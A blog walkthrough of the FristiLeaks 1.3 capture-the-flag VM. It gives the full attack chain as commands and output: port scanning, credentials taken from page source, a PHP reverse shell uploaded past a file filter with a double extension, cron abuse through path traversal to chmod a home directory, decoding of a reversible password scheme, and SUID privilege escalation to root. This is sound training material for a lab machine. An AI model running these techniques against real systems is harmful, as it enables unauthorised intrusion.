---
layout: blog_item
title: "FristiLeaks 1.3 Walkthrough"
date: "2015-12-15"
author: Arr0way
description: 'FristiLeaks - Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..

<div class="note warning">
  <h5>VMWare Users - MAC Address</h5>
  <p>If you are a VMWare user, you'll need to manually set the MAC Address to <code>08:00:27:A5:A6:76</code>.</p>
</div>


### Port Scanning

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 192.168.221.150

{% endhighlight %}


### Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
               <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</p></pc>
           </td>
        </tr>
        </tbody>

</table>
</div>

### HTTP Enumeration

Enumeration of the web application, revealed the page <code>/fristi</code> with the following form:

![webform](/img/blog/fristileaks/webform.png)

Page source interrogation revealed the following code comment:

{% highlight bash %}

<!--
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->

{% endhighlight %}

The following base64 encoded image was also discovered and decoded to reveal an image containing the string: <code>keKkeKKeKKeKkEkkEk</code>  

{% highlight bash %}

echo "iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx\njwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl\nS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw\nB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f\nm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ\nZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb\nDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd\njJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU\n12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5\nuvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1\n04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq\ni1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg\ntOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws\n30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl\n3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK\nul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q\nmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34\nrPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe\nEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH\nAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk\nCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR\nU5ErkJggg==" | base64 --decode
 1274* echo "iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx\njwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl\nS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw\nB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f\nm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ\nZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb\nDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd\njJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU\n12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5\nuvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1\n04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq\ni1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg\ntOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws\n30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl\n3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK\nul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q\nmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34\nrPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe\nEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH\nAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk\nCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR\nU5ErkJggg==" | base64 --decode > image.png

{% endhighlight %}


The following credentials were used to login to the web application:

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><b>eezeepz</b></p></pc>
           </td>
           <td>
               <pc><p><code>keKkeKKeKKeKkEkkEk</code></p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

## PHP Reverse Shell

The file name <code>shell.php.png</code> was used to bypass the web application filtering, the file was still executed as PHP (likely due to incorrectly configured Apache MIME types). A reverse shell successfully connected back to a netcat listener.

{% highlight bash %}
[root:~]# netcat -n -v -l -p 443
listening on [any] 443 ...
connect to [192.168.221.139] from (UNKNOWN) [192.168.221.150] 34400
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 18:26:33 up  5:37,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.1$ whoami
whoami
apache
{% endhighlight %}

## Local Enumeration

Enumeration of the users home dir found several binary files and the following txt file:

{% highlight bash %}

sh-4.1$ cat notes
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry

{% endhighlight %}

The following directory traversal (the command had to originate from /usr/bin/) was used to set the permissions for <code>/home/admin</code> **world readable**.

{% highlight bash %}

echo "/usr/bin/../../bin/chmod -R 777 /home/admin" > /tmp/runthis

{% endhighlight %}

### /home/admin

Inspection of <code>/home/admin</code> disclosed the following:

{% highlight bash %}

sh-4.1$ cd /home/admin
cd /home/admin
sh-4.1$ ls -la
ls -la
total 652
drwxrwxrwx. 2 admin     admin       4096 Nov 19 02:03 .
drwxr-xr-x. 5 root      root        4096 Nov 19 01:40 ..
-rwxrwxrwx. 1 admin     admin         18 Sep 22 12:40 .bash_logout
-rwxrwxrwx. 1 admin     admin        176 Sep 22 12:40 .bash_profile
-rwxrwxrwx. 1 admin     admin        124 Sep 22 12:40 .bashrc
-rwxrwxrwx  1 admin     admin      45224 Nov 18 13:42 cat
-rwxrwxrwx  1 admin     admin      48712 Nov 18 14:14 chmod
-rwxrwxrwx  1 admin     admin        737 Nov 18 14:48 cronjob.py
-rwxrwxrwx  1 admin     admin         21 Nov 18 15:21 cryptedpass.txt
-rwxrwxrwx  1 admin     admin        258 Nov 18 15:20 cryptpass.py
-rwxrwxrwx  1 admin     admin      90544 Nov 18 13:49 df
-rwxrwxrwx  1 admin     admin      24136 Nov 18 13:40 echo
-rwxrwxrwx  1 admin     admin     163600 Nov 18 13:42 egrep
-rwxrwxrwx  1 admin     admin     163600 Nov 18 13:42 grep
-rwxrwxrwx  1 admin     admin      85304 Nov 18 13:41 ps
-rw-r--r--  1 fristigod fristigod     25 Nov 19 01:47 whoisyourgodnow.txt
sh-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
sh-4.1$ cat cryptedpass.txt
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

{% endhighlight %}

The following python script appeared to create the above string in cryptedpass.txt:

{% highlight python %}

sh-4.1$ cat cryptpass.py
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult

{% endhighlight %}

The above script was modified on the attacking machine to decode the string:

{% highlight python %}

#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

def decodeString(str):
    string = str[::-1]
    string = string.encode("rot13")
    return base64.b64decode(string)

print decodeString(sys.argv[1])

{% endhighlight %}

String successfully decoded:

{% highlight bash %}

[root:~]# python reverse.py "=RFn0AKnlMHMPIzpyuTI0ITG"
LetThereBeFristi!

{% endhighlight %}

Using the previously decoded string it was possible to <code>su -</code> to the user **fristigod**.

{% highlight bash %}
sh-4.1$ python -c 'import pty;pty.spawn("/bin/sh")'
python -c 'import pty;pty.spawn("/bin/sh")'
sh-4.1$ su - fristigod
su - fristigod
Password: LetThereBeFristi!

-bash-4.1$ id
id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
{% endhighlight %}


Enumeration as the user **fristigod** revealed the SUID binary: <code>/var/fristigod/.secret_admin_stuff/doCom</code>.

{% highlight bash %}

-bash-4.1$ ls -la /var/fristigod
ls -la /var/fristigod
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25 05:55 .
drwxr-xr-x. 19 root      root      4096 Nov 19 01:41 ..
-rw-------   1 fristigod fristigod  864 Nov 25 06:09 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25 05:53 .secret_admin_stuff
-bash-4.1$ cd .se
cd .secret_admin_stuff/
-bash-4.1$ ls
ls
doCom
-bash-4.1$ ls -la
ls -la
total 16
drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25 05:53 .
drwxr-x---  3 fristigod fristigod 4096 Nov 25 05:55 ..
-rwsr-sr-x  1 root      root      7529 Nov 25 05:53 doCom
-bash-4.1$ ./d
./doCom
Nice try, but wrong user ;)

{% endhighlight %}


## Privilege Escalation

Execution of the doCom binary was possible using the user **fristi** from the logged in user **fristigod**, successfully escalating privileges.

{% highlight bash %}
sudo -u fristi .secret_admin_stuff/doCom /bin/sh
sh-4.1# id
id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
{% endhighlight %}

## Root Flag

{% highlight bash %}

cat fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Flag: Y0u_kn0w_y0u_l0ve_fr1st1

{% endhighlight %}

Thanks for the VM :)
